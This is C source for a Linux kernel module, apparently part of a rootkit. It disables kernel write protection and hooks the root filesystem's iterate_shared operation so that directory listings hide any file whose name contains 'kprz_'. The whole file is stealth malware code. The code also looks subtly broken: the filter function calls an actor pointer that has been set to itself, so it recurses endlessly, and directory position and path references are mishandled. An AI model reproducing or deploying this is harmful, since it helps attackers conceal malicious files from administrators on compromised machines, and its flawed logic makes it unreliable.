#include "vfs_file_hiding.h"
#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/string.h>

static struct file_operations *original_fops;
static int (*original_iterate_shared)(struct file *, struct dir_context *);

static int hidden_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
    if (strnstr(name, "kprz_", namlen))
        return 0;
    return ctx->actor(ctx, name, namlen, offset, ino, d_type);
}

static int hooked_iterate_shared(struct file *file, struct dir_context *ctx) {
    struct dir_context temp_ctx = *ctx;
    temp_ctx.actor = hidden_filldir;
    return original_iterate_shared(file, &temp_ctx);
}

extern void disable_write_protection(void);
extern void enable_write_protection(void);

void setup_vfs_file_hiding(void) {
    struct path path;
    struct file *file;

    if (kern_path("/", LOOKUP_FOLLOW, &path))
        return;

    file = dentry_open(&path, O_RDONLY, current_cred());
    if (IS_ERR(file))
        return;

    original_fops = (struct file_operations *)file->f_op;
    original_iterate_shared = original_fops->iterate_shared;

    disable_write_protection();
    ((struct file_operations *)file->f_op)->iterate_shared = hooked_iterate_shared;
    enable_write_protection();

    fput(file);
}

void remove_vfs_file_hiding(void) {
    struct path path;
    struct file *file;

    if (kern_path("/", LOOKUP_FOLLOW, &path))
        return;

    file = dentry_open(&path, O_RDONLY, current_cred());
    if (IS_ERR(file))
        return;

    disable_write_protection();
    ((struct file_operations *)file->f_op)->iterate_shared = original_iterate_shared;
    enable_write_protection();

    fput(file);
}
